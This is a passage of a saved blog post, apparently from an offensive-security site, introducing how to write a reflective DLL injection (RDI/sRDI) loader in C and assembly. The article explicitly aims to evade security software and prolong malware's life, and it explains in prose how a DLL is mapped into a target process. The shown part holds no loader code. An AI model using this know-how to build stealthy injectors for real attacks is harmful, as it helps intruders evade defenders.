<!DOCTYPE html>
<!-- saved from url=(0078)https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/ -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Writing your own RDI /sRDI loader using C and ASM</title>
    <link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/screen.css">
    <link rel="stylesheet" href="./Writing your own RDI _sRDI loader using C and ASM_files/tocbot.css">
    <style>
        .gh-content {
            position: relative;
        }

        .gh-toc > .toc-list {
            position: relative;
        }

        .toc-list {
            overflow: hidden;
            list-style: none;
        }

        @media (min-width: 1300px) {
            .gh-sidebar {
                position: absolute;
                top: 0;
                bottom: 0;
                margin-top: 4vmin;
                grid-column: wide-start / main-start; /* Place the TOC to the left of the content */
            }

            .gh-toc {
                position: sticky; /* On larger screens, TOC will stay in the same spot on the page */
                top: 4vmin;
            }
        }

        .gh-toc .is-active-link::before {
            background-color: var(--ghost-accent-color); /* Defines TOC   accent color based on Accent color set in Ghost Admin */
        }
    </style>
    <meta name="description" content="In this post, I am going to show the readers how to write their own RDI/sRDI loader in C, and then show how to optimize the code to make it fully position independent.">
    <link rel="icon" href="https://blog.malicious.group/content/images/size/w256h256/2022/09/logo-3.png" type="image/png">
    <link rel="canonical" href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    
    <meta property="og:site_name" content="Malicious Group">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Writing your own RDI /sRDI loader using C and ASM">
    <meta property="og:description" content="In this post, I am going to show the readers how to write their own RDI/sRDI loader in C, and then show how to optimize the code to make it fully position independent.">
    <meta property="og:url" content="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/">
    <meta property="og:image" content="https://blog.malicious.group/content/images/2023/04/rdi-srdi.png">
    <meta property="article:published_time" content="2023-04-07T16:19:44.000Z">
    <meta property="article:modified_time" content="2023-04-27T18:35:06.000Z">
    <meta property="article:tag" content="Malware Development">
    
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="Writing your own RDI /sRDI loader using C and ASM">
    <meta name="twitter:description" content="In this post, I am going to show the readers how to write their own RDI/sRDI loader in C, and then show how to optimize the code to make it fully position independent.">
    <meta name="twitter:url" content="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/">
    <meta name="twitter:image" content="https://blog.malicious.group/content/images/2023/04/rdi-srdi.png">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="d3d">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="Malware Development">
    <meta name="twitter:site" content="@deadvolvo">
    <meta name="twitter:creator" content="@deadvolvo">
    <meta property="og:image:width" content="1440">
    <meta property="og:image:height" content="1024">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "Malicious Group",
        "url": "https://blog.malicious.group/",
        "logo": {
            "@type": "ImageObject",
            "url": "https://blog.malicious.group/content/images/2022/09/logo.png"
        }
    },
    "author": {
        "@type": "Person",
        "name": "d3d",
        "image": {
            "@type": "ImageObject",
            "url": "https://blog.malicious.group/content/images/2022/09/author-d3d.png",
            "width": 96,
            "height": 96
        },
        "url": "https://blog.malicious.group/author/d3d/",
        "sameAs": [
            "https://twitter.com/deadvolvo"
        ]
    },
    "headline": "Writing your own RDI /sRDI loader using C and ASM",
    "url": "https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/",
    "datePublished": "2023-04-07T16:19:44.000Z",
    "dateModified": "2023-04-27T18:35:06.000Z",
    "image": {
        "@type": "ImageObject",
        "url": "https://blog.malicious.group/content/images/2023/04/rdi-srdi.png",
        "width": 1440,
        "height": 1024
    },
    "keywords": "Malware Development",
    "description": "In this post, I am going to show the readers how to write their own RDI/sRDI loader in C, and then show how to optimize the code to make it fully position independent.\n\n",
    "mainEntityOfPage": "https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/"
}
    </script>

    <meta name="generator" content="Ghost 5.47">
    <link rel="alternate" type="application/rss+xml" title="Malicious Group" href="https://blog.malicious.group/rss/">
    <script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/portal.min.js.download" data-i18n="false" data-ghost="https://blog.malicious.group/" data-key="c6d4ec113710d11060a6072be3" data-api="https://malicious-group.ghost.io/ghost/api/content/" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
.gh-post-upgrade-cta {
    display: flex;
    flex-direction: column;
    align-items: center;
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
    text-align: center;
    width: 100%;
    color: #ffffff;
    font-size: 16px;
}

.gh-post-upgrade-cta-content {
    border-radius: 8px;
    padding: 40px 4vw;
}

.gh-post-upgrade-cta h2 {
    color: #ffffff;
    font-size: 28px;
    letter-spacing: -0.2px;
    margin: 0;
    padding: 0;
}

.gh-post-upgrade-cta p {
    margin: 20px 0 0;
    padding: 0;
}

.gh-post-upgrade-cta small {
    font-size: 16px;
    letter-spacing: -0.2px;
}

.gh-post-upgrade-cta a {
    color: #ffffff;
    cursor: pointer;
    font-weight: 500;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a:hover {
    color: #ffffff;
    opacity: 0.8;
    box-shadow: none;
    text-decoration: underline;
}

.gh-post-upgrade-cta a.gh-btn {
    display: block;
    background: #ffffff;
    text-decoration: none;
    margin: 28px 0 0;
    padding: 8px 18px;
    border-radius: 4px;
    font-size: 16px;
    font-weight: 600;
}

.gh-post-upgrade-cta a.gh-btn:hover {
    opacity: 0.92;
}</style>
    <script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/sodo-search.min.js.download" data-key="c6d4ec113710d11060a6072be3" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.1/umd/main.css" data-sodo-search="https://malicious-group.ghost.io/" crossorigin="anonymous"></script>
    
    <link href="https://blog.malicious.group/webmentions/receive/" rel="webmention">
    <script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/cards.min.js.download"></script>
    <link rel="stylesheet" type="text/css" href="./Writing your own RDI _sRDI loader using C and ASM_files/cards.min.css">
    <script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/comment-counts.min.js.download" data-ghost-comments-counts-api="https://blog.malicious.group/members/api/comments/counts/"></script>
    <script defer="" src="./Writing your own RDI _sRDI loader using C and ASM_files/member-attribution.min.js.download"></script>
    <!-- Google tag (gtag.js) -->
<script async="" src="./Writing your own RDI _sRDI loader using C and ASM_files/js"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-R7FL4B790J');
</script>

<style>
    @import url('https://cdn.rawgit.com/lonekorean/gist-syntax-themes/d49b91b3/stylesheets/one-dark.css');
    
.gh-topic-grid .gh-card-image img {
    height: 100%;
    left: 0;
    -o-object-fit: cover;
    object-fit: contain;
    position: absolute;
    top: 0;
    width: 100%;
}
    
.gh-cover {
    --cover-height: 50vh;
    align-items: center;
    background-color: rgba(0,0,0,0.7);
    display: flex;
    justify-content: center;
    margin-bottom: -16px;
}

li.toc-list-item {
    font-size: 0.75em;
}
    
.gh-content li.toc-list-item a {
     text-decoration: none;
}
    
ol.toc-list {
	padding-right:20px;
}
    
body:not(.is-head-stacked) .gh-head-inner {
    border-bottom: 0px solid var(--color-light-gray);
}
    
    
</style>

<style>
.reading-progress {
  position: fixed;
  top: 0;
  z-index: 999;
  width: 100%;
  height: 5px; /* Progress bar height */
  background: #c5d2d9; /* Progress bar background color */
  -webkit-appearance: none;
     -moz-appearance: none;
          appearance: none; /* Hide default progress bar */
}

.reading-progress::-webkit-progress-bar {
  background-color: transparent;
}

.reading-progress::-webkit-progress-value {
  background: var(--ghost-accent-color); /* Progress bar color */
}
</style>
<style>:root {--ghost-accent-color: #f14668;}</style>
<style>.gh-portal-account-header{display:flex;flex-direction:column;align-items:center;margin:0 0 32px}.gh-portal-account-header .gh-portal-avatar{margin:6px 0 8px!important}.gh-portal-account-data{margin-bottom:40px}footer.gh-portal-account-footer{display:flex}.gh-portal-account-footer.paid{margin-top:12px}.gh-portal-account-footermenu{display:flex;align-items:center;list-style:none;padding:0;margin:0}.gh-portal-account-footerright{display:flex;flex-grow:1;align-items:center;justify-content:flex-end}.gh-portal-account-footermenu li{margin-right:16px}.gh-portal-account-footermenu li:last-of-type{margin-right:0}.gh-portal-freeaccount-newsletter{display:flex;align-items:center;justify-content:space-between;margin-top:24px}.gh-portal-freeaccount-newsletter .label{display:flex;flex-direction:column;flex-grow:1}.gh-portal-free-ctatext{margin-top:-12px}.gh-portal-cancelcontinue-container{margin:24px 0 32px}.gh-portal-list-detail .gh-portal-email-notice{display:flex;align-items:center;gap:5px;margin-top:6px;color:var(--red);font-weight:500;font-size:1.25rem;letter-spacing:.2px}.gh-portal-email-notice-icon{width:20px;height:20px}.gh-portal-billing-button-loader{width:32px;height:32px;margin-right:-3px;opacity:.6}.gh-portal-product-icon{width:52px;margin-right:12px;border-radius:2px}.gh-portal-account-discountcontainer{position:relative;display:flex;align-items:center}.gh-portal-account-old-price{text-decoration:line-through;color:var(--grey9)!important}.gh-portal-account-tagicon{width:16px;height:16px;color:var(--brandcolor);margin-right:5px;z-index:999}@media (max-width: 390px){.gh-portal-account-footer{padding:0!important}}@media (max-width: 340px){.gh-portal-account-footer{padding:0!important;flex-wrap:wrap;gap:12px}.gh-portal-account-footer .gh-portal-account-footerright{justify-content:flex-start}}.gh-email-suppressed-page-title{margin-bottom:14px}.gh-email-suppressed-page-icon{display:block;width:38px;height:38px;margin:0 auto 18px}.gh-email-suppressed-page-text{padding:0 14px;text-align:center;color:var(--grey6)}.gh-email-faq-footer-text{color:var(--grey8)}.gh-portal-list-detail.email-newsletter .gh-email-faq-page-button{display:block;margin-top:3px}.accountEmail .gh-email-faq-page-button{margin-left:4px}.emailReceivingFAQ .gh-portal-btn-back,.emailReceivingFAQ .gh-portal-btn-back:hover{left:calc(6vmin - 14px)}.emailReceivingFAQ .gh-portal-closeicon-container{right:calc(6vmin - 20px)}@media (max-width: 480px){.emailReceivingFAQ .gh-portal-btn-back,.emailReceivingFAQ .gh-portal-btn-back:hover{left:16px}.emailReceivingFAQ .gh-portal-closeicon-container{right:24px}}.gh-email-faq-page-button{color:var(--brandcolor);cursor:pointer;background:none;transition:color linear .1s;font-size:1.45rem}</style><style>.App {
  text-align: center;
}

.App-logo {
  height: 40vmin;
  pointer-events: none;
}

@media (prefers-reduced-motion: no-preference) {
  .App-logo {
    -webkit-animation: App-logo-spin infinite 20s linear;
            animation: App-logo-spin infinite 20s linear;
  }
}

.App-header {
  background-color: #282c34;
  min-height: 100vh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  font-size: calc(10px + 2vmin);
  color: white;
}

.App-link {
  color: #61dafb;
}

@-webkit-keyframes App-logo-spin {
  from {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  to {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}

@keyframes App-logo-spin {
  from {
    -webkit-transform: rotate(0deg);
            transform: rotate(0deg);
  }
  to {
    -webkit-transform: rotate(360deg);
            transform: rotate(360deg);
  }
}

/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIndlYnBhY2s6Ly9zcmMvQXBwLmNzcyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiQUFBQTtFQUNFLGtCQUFrQjtBQUNwQjs7QUFFQTtFQUNFLGNBQWM7RUFDZCxvQkFBb0I7QUFDdEI7O0FBRUE7RUFDRTtJQUNFLG9EQUE0QztZQUE1Qyw0Q0FBNEM7RUFDOUM7QUFDRjs7QUFFQTtFQUNFLHlCQUF5QjtFQUN6QixpQkFBaUI7RUFDakIsYUFBYTtFQUNiLHNCQUFzQjtFQUN0QixtQkFBbUI7RUFDbkIsdUJBQXVCO0VBQ3ZCLDZCQUE2QjtFQUM3QixZQUFZO0FBQ2Q7O0FBRUE7RUFDRSxjQUFjO0FBQ2hCOztBQUVBO0VBQ0U7SUFDRSwrQkFBdUI7WUFBdkIsdUJBQXVCO0VBQ3pCO0VBQ0E7SUFDRSxpQ0FBeUI7WUFBekIseUJBQXlCO0VBQzNCO0FBQ0Y7O0FBUEE7RUFDRTtJQUNFLCtCQUF1QjtZQUF2Qix1QkFBdUI7RUFDekI7RUFDQTtJQUNFLGlDQUF5QjtZQUF6Qix5QkFBeUI7RUFDM0I7QUFDRiIsInNvdXJjZXNDb250ZW50IjpbIi5BcHAge1xuICB0ZXh0LWFsaWduOiBjZW50ZXI7XG59XG5cbi5BcHAtbG9nbyB7XG4gIGhlaWdodDogNDB2bWluO1xuICBwb2ludGVyLWV2ZW50czogbm9uZTtcbn1cblxuQG1lZGlhIChwcmVmZXJzLXJlZHVjZWQtbW90aW9uOiBuby1wcmVmZXJlbmNlKSB7XG4gIC5BcHAtbG9nbyB7XG4gICAgYW5pbWF0aW9uOiBBcHAtbG9nby1zcGluIGluZmluaXRlIDIwcyBsaW5lYXI7XG4gIH1cbn1cblxuLkFwcC1oZWFkZXIge1xuICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjgyYzM0O1xuICBtaW4taGVpZ2h0OiAxMDB2aDtcbiAgZGlzcGxheTogZmxleDtcbiAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gIGZvbnQtc2l6ZTogY2FsYygxMHB4ICsgMnZtaW4pO1xuICBjb2xvcjogd2hpdGU7XG59XG5cbi5BcHAtbGluayB7XG4gIGNvbG9yOiAjNjFkYWZiO1xufVxuXG5Aa2V5ZnJhbWVzIEFwcC1sb2dvLXNwaW4ge1xuICBmcm9tIHtcbiAgICB0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTtcbiAgfVxuICB0byB7XG4gICAgdHJhbnNmb3JtOiByb3RhdGUoMzYwZGVnKTtcbiAgfVxufVxuIl0sInNvdXJjZVJvb3QiOiIifQ== */</style></head>

<body class="post-template tag-malware-development is-head-left-logo has-serif-body is-head-dark is-dropdown-loaded">
<div class="gh-site">

    <header id="gh-head" class="gh-head gh-outer">
        <div class="gh-head-inner gh-inner">
            <div class="gh-head-brand">
                <div class="gh-head-brand-wrapper">
                    
                    <a class="gh-head-logo" href="https://blog.malicious.group/">
                            <img src="./Writing your own RDI _sRDI loader using C and ASM_files/logo.png" alt="Malicious Group">
                    </a>
                    
                </div>
                <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                <button class="gh-burger"></button>
            </div>

            <nav class="gh-head-menu">
                <ul class="nav">
    <li class="nav-home"><a href="https://blog.malicious.group/">Home</a></li>
    <li class="nav-offensive-security"><a href="https://blog.malicious.group/tag/offensive-security/">Offensive Security</a></li>
    <li class="nav-malware-development"><a href="https://blog.malicious.group/tag/malware-development/">Malware Development</a></li>
    <li class="nav-author"><a href="https://blog.malicious.group/about/">Author</a></li>
</ul>

            </nav>

            <div class="gh-head-actions">
                    <button class="gh-search gh-icon-btn" aria-label="Search this site" data-ghost-search=""><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" width="20" height="20"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"></path></svg></button>
                    <div class="gh-head-members">
                                <a class="gh-head-link gh-portal-close" href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#/portal/signin" data-portal="signin">Sign in</a>
                                <a class="gh-head-btn gh-btn gh-primary-btn gh-portal-close" href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#/portal/signup" data-portal="signup">Subscribe</a>
                    </div>
            </div>
        </div>
    </header>

    <progress class="reading-progress" value="0" max="100" aria-label="Reading progress"></progress>

<main class="gh-main">
        <article class="gh-article post tag-malware-development">

            <header class="gh-article-header gh-canvas">
                    <a class="gh-article-tag" href="https://blog.malicious.group/tag/malware-development/">Malware Development</a>

                <h1 class="gh-article-title">Writing your own RDI /sRDI loader using C and ASM</h1>

                    <aside class="gh-article-sidebar">

        <div class="gh-author-image-list">
                <a class="gh-author-image" href="https://blog.malicious.group/author/d3d/">
                        <img src="./Writing your own RDI _sRDI loader using C and ASM_files/author-d3d.png" alt="d3d">
                </a>
        </div>

        <div class="gh-author-name-list">
                <h4 class="gh-author-name">
                    <a href="https://blog.malicious.group/author/d3d/">d3d</a>
                </h4>
                
        </div>

        <div class="gh-article-meta">
            <div class="gh-article-meta-inner">
                <time class="gh-article-date" datetime="2023-04-07">Apr 7, 2023</time>
                    <span class="gh-article-meta-sep"></span>
                    <span class="gh-article-length">21 min</span>
            </div>
        </div>

    </aside>

                    <p class="gh-article-excerpt">In this post, I am going to show the readers how to write their own RDI/sRDI loader in C, and then show how to optimize the code to make it fully position independent.

</p>

                    <figure class="gh-article-image">
        <img srcset="/content/images/size/w300/2023/04/rdi-srdi.png 300w,
                    /content/images/size/w720/2023/04/rdi-srdi.png 720w,
                    /content/images/size/w960/2023/04/rdi-srdi.png 960w,
                    /content/images/size/w1200/2023/04/rdi-srdi.png 1200w,
                    /content/images/size/w2000/2023/04/rdi-srdi.png 2000w" sizes="(max-width: 1200px) 100vw, 1200px" src="./Writing your own RDI _sRDI loader using C and ASM_files/rdi-srdi.png" alt="Writing your own RDI /sRDI loader using C and ASM">
    </figure>
            </header>

            <section class="gh-content gh-canvas">
                <aside class="gh-sidebar"><div class="gh-toc"><ol class="toc-list "><li class="toc-list-item is-active-li"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#tl-dr" class="toc-link node-name--H2  is-active-link">TL; DR</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#prerequisites" class="toc-link node-name--H2 ">Prerequisites</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#build-setup" class="toc-link node-name--H2 ">Build Setup</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#dll-creation" class="toc-link node-name--H2 ">DLL Creation</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basic-rdi-loader" class="toc-link node-name--H2 ">Basic RDI Loader</a><ol class="toc-list  is-collapsible is-collapsed"><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#make-required-folders" class="toc-link node-name--H3 ">Make required folders</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#make-required-files" class="toc-link node-name--H3 ">Make required files</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-1" class="toc-link node-name--H3 ">Basic - Step 1</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-2" class="toc-link node-name--H3 ">Basic - Step 2</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-3" class="toc-link node-name--H3 ">Basic - Step 3</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-4" class="toc-link node-name--H3 ">Basic - Step 4</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-5" class="toc-link node-name--H3 ">Basic - Step 5</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basicstep-6" class="toc-link node-name--H3 ">Basic - Step 6</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#basic-final" class="toc-link node-name--H3 ">Basic Final</a></li></ol></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-loader" class="toc-link node-name--H2 ">Stealth Loader</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#helper-functions" class="toc-link node-name--H2 ">Helper Functions</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#function-obfuscation" class="toc-link node-name--H2 ">Function Obfuscation</a><ol class="toc-list  is-collapsible is-collapsed"><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-1" class="toc-link node-name--H3 ">Stealth Step 1</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-2" class="toc-link node-name--H3 ">Stealth Step 2</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-3" class="toc-link node-name--H3 ">Stealth Step 3</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-4" class="toc-link node-name--H3 ">Stealth Step 4</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-5" class="toc-link node-name--H3 ">Stealth Step 5</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-6" class="toc-link node-name--H3 ">Stealth Step 6</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-7" class="toc-link node-name--H3 ">Stealth Step 7</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-step-8" class="toc-link node-name--H3 ">Stealth Step 8</a></li></ol></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-final" class="toc-link node-name--H2 ">Stealth Final</a></li><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#stealth-srdi-loader" class="toc-link node-name--H2 ">Stealth sRDI Loader</a><ol class="toc-list  is-collapsible is-collapsed"><li class="toc-list-item"><a href="https://blog.malicious.group/writing-your-own-rdi-srdi-loader-using-c-and-asm/#replace-step-1" class="toc-link node-name--H3 ">Replace Step 1</a></li></ol></li></ol></div></aside> 
                <p>As a security researcher and malware developer, being able to create your own loaders using techniques like RDI/sRDI can assist in avoiding detection by security software and can increase the longevity of a given malware variant. The more unique an implant is, the more difficult it is for security software to detect and analyze, making it more effective in its intended purpose. Learning how to write your own loaders using techniques such as RDI/sRDI loading is a crucial element of maintaining a competitive edge in the field.</p><h2 id="tl-dr">TL; DR</h2><p>The final code example was added to my repo below, but if you are learning, I highly recommend re-typing everything as you go to get the most of out it.</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/maliciousgroup/RDI-SRDI?ref=blog.malicious.group"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - maliciousgroup/RDI-SRDI: This repo goes with the blog entry at blog.malicious.group entitled ‚ÄúWriting your own RDI / sRDI loader using C and ASM‚Äù.</div><div class="kg-bookmark-description">This repo goes with the blog entry at blog.malicious.group entitled &amp;quot;Writing your own RDI / sRDI loader using C and ASM&amp;quot;. - GitHub - maliciousgroup/RDI-SRDI: This repo goes with the blog‚Ä¶</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="./Writing your own RDI _sRDI loader using C and ASM_files/fluidicon.png" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">maliciousgroup</span></div></div><div class="kg-bookmark-thumbnail"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/RDI-SRDI" alt=""></div></a></figure><p>With that being said, let's take a look at the prerequisites required to follow along with this paper.</p><hr><p></p><h2 id="prerequisites">Prerequisites</h2><p></p><p>Reflective DLL Injection (RDI) and Shellcode Reflective DLL Injection (sRDI) are techniques used by attackers to load a DLL or shellcode into a process without traditional injection methods. RDI was introduced by Stephen Fewer in 2009, while sRDI was presented by Adam Chester in 2016 at the DerbyCon conference. Both researchers are acknowledged for their contribution in introducing these techniques to the public.</p><p>To fully grasp the examples in this post, it is essential to have a solid understanding of the PE file format and how it is typically loaded by Windows. </p><p>The following list outlines several key steps that Windows takes when loading a PE file. These are also the same steps we will need to take when writing our RDI loader.</p><!--kg-card-begin: markdown--><ol>
<li>
<p>In this step, the binary representation of the DLL file is read from the file system or from memory. This typically involves opening the file, reading its contents, and storing the binary data in memory for further processing.</p>
</li>
<li>
<p>The PE header of the DLL file is parsed to extract important information such as the size of the image. The PE header is a data structure located at the beginning of the DLL file that contains information about the organization and layout of the file, including the size of the different sections.</p>
</li>
<li>
<p>In this step, memory is allocated in the address space of the target process to hold the binary data of the DLL. This is typically done using the VirtualAllocEx function, which reserves and commits a block of memory with the appropriate size to accommodate the entire DLL image. Sections are then iterated and copied to the newly allocated memory using the <code>PIMAGE_SECTION_HEADER</code> structure.</p>
</li>
<li>
<p>The relocations, also known as fixups, are applied to the DLL image to adjust the addresses of the code and data within the image to match the base address at which the image is loaded in the target process. This step involves iterating through the relocation table in the PE header and applying the necessary address adjustments to the corresponding locations in the allocated memory.</p>
</li>
<li>
<p>The Import Address Table (IAT) of the DLL is processed to resolve and update the import references to external functions and data. This step involves iterating through the IAT and resolving the import references by loading the required modules into the target process, obtaining the addresses of the imported functions or data, and updating the IAT with the resolved addresses.</p>
</li>
<li>
<p>The protection settings of the different sections in the DLL image are applied to the corresponding memory pages in the allocated memory. This involves setting the appropriate memory protection flags, such as <code>PAGE_EXECUTE_READWRITE</code> for executable sections and <code>PAGE_READWRITE</code> for writable sections, using the <code>VirtualProtectEx</code> function.</p>
</li>
<li>
<p>If the DLL has Thread Local Storage (TLS) callbacks, they are executed in the target process. TLS is a mechanism that allows each thread in a process to have its own storage for thread-specific data. TLS callbacks are functions that are executed when a thread is created or terminated, and they are typically used to initialize or clean up thread-specific data.</p>
</li>
<li>
<p>Finally, the execution is handed over to the entry point of the DLL, which is the <code>DllMain</code> function. <code>DllMain</code> is a special function in the DLL that is automatically called by the operating system when the DLL is loaded or unloaded, and it is responsible for performing any necessary initialization or cleanup tasks specific to the DLL.</p>
</li>
</ol>
<!--kg-card-end: markdown--><p>To ensure a thorough understanding of the steps mentioned above, it's crucial to imagine how each task can be executed with C code. If you're not confident about this yet or wish to gain more knowledge about the functioning of the PE format, I highly suggest taking up Xeno Kovah's OST2 <a href="https://www.youtube.com/playlist?list=PLUFkSN0XLZ-n_Na6jwqopTt1Ki57vMIc3&amp;ref=blog.malicious.group">courses</a> or watching Dr. Josh Stroschein's <a href="https://www.youtube.com/watch?v=3fzSUMlxVz0&amp;ref=blog.malicious.group">videos</a> on YouTube.</p><p>From this point on, I will also be covering the material with the assumption the reader has previous knowledge of at least some of the subject matter I am going to cover in the following sections.</p><hr><p></p><h2 id="build-setup">Build Setup</h2><p></p><p>For the development, I chose to utilize Jetbrains' <em>CLion</em> as my preferred IDE. Since I had previously purchased <em>PyCharm Professional</em>, I already had a Jetbrains account and found <em>CLion</em> to be a great tool for this task.</p><p>In the upcoming build process, my first step would involve creating a generic DLL solely intended for testing our RDI/sRDI loaders. After successfully creating the DLL, I will proceed to construct a fundamental RDI loader utilizing the standard Windows API, which will perform the injection of the test DLL created in the next step. Lastly, I will create a discreet RDI/sRDI loader featuring function hashing, obfuscated function pointers, and utilizing the Native API sourced from ntdll.dll.</p><p>For clarity, I will be breaking up the loaders code into the parts listed in the above section. &nbsp;I found this is the easiest way to show how the loader works in both the Standard API, vs the Native API.</p><hr><p></p><h2 id="dll-creation">DLL Creation</h2><p></p><!--kg-card-begin: html--><p>My first step using CLion as the IDE will be to create a new C project, which I will name <code>dll_poc</code> as shown in the example below.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-3.png" class="kg-image" alt="" loading="lazy" width="2000" height="1624" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-3.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-3.png 1000w, https://blog.malicious.group/content/images/size/w1600/2023/04/image-3.png 1600w, https://blog.malicious.group/content/images/2023/04/image-3.png 2002w" sizes="(min-width: 720px) 720px"></figure><!--kg-card-begin: html--><p>After creating the <code>dll_poc</code> project, you should see the following image which will allow you to start editing the <code>main.c</code> file.</p><!--kg-card-end: html--><figure class="kg-card kg-image-card"><img src="./Writing your own RDI _sRDI loader using C and ASM_files/image-4.png" class="kg-image" alt="" loading="lazy" width="2000" height="1171" srcset="https://blog.malicious.group/content/images/size/w600/2023/04/image-4.png 600w, https://blog.malicious.group/content/images/size/w1000/2023/04/image-4.png 1000w, 